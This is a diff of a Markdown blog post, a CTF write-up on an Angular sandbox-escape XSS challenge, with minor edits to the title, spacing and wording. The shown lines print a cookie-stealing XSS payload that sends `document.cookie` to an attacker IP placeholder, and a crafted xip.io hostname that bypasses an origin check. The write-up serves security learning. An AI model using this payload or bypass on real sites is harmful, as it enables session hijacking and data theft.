@@ -1,10 +1,11 @@
 ---
-title: STF-<You shall not pass!>
+title: STF-You shall not pass!
 author: Jason Chua (Coldspot)
 date: 2020-12-08 00:00:51 +0800
 categories: [CTF]
 tags: [sandbox, tech, angular, xss]
 toc: true
+comments: true
 ---
 
 
@@ -92,6 +93,8 @@ To test the script locally, download the vulnerable Angular source code from the
 </script>
 ```
 The result should be something like this:
+
+
 ![upload-image](/assets/img/blog/STF-You-shall-not-pass!/12.png)
 
 Assuming you have [python](https://www.python.org/) installed, run the following command in the root directory in a command prompt and open up `http://localhost` on a web browser
@@ -151,9 +154,9 @@ This Regular Expression check if `event.origin` begins with  `yhi8bpzolrog3yw17f
 
 ## Finishing up
 
-Finally, the payload will be changed from `a, alert(“COLDSPOT”),a` to ` a,document.location = "http://<IPADDRESS>/" + document.cookie,a`. Finally, port forward and retrieve your IP address and replace <IPADDRESS> with your own IP address.
+Finally, the payload will be changed from `a, alert(“COLDSPOT”),a` to `a,document.location = "http://<IPADDRESS>/" + document.cookie,a`. Finally, port forward and retrieve your IP address and replace <IPADDRESS> with your own IP address.
 
-Entering ` yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg.<IPADDRESS>.xip.io` into `Add new website to hack` form will cause the server to request a URL on our local server with the flag as the filename. 
+Entering `yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg.<IPADDRESS>.xip.io` into `Add new website to hack` form will cause the server to request a URL on our local server with the flag as the filename. 
 
 ![upload-image](/assets/img/blog/STF-You-shall-not-pass!/17.png)
 
@@ -161,7 +164,7 @@ Entering ` yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg.<IPADDRESS>.xip.io` in
 
 On the CTF day itself, I did not want to mess with port forwarding as many ports from my device were open and vulnerable. As such, I used a $5/month droplet on DigitalOcean and my own domain name `coldspot.me`. 
 
-The total cost of the server can be seen in the picture below:
+The grand total for the server cost can be seen in the picture below:
 ![upload-image](/assets/img/blog/STF-You-shall-not-pass!/18.png)
 
 
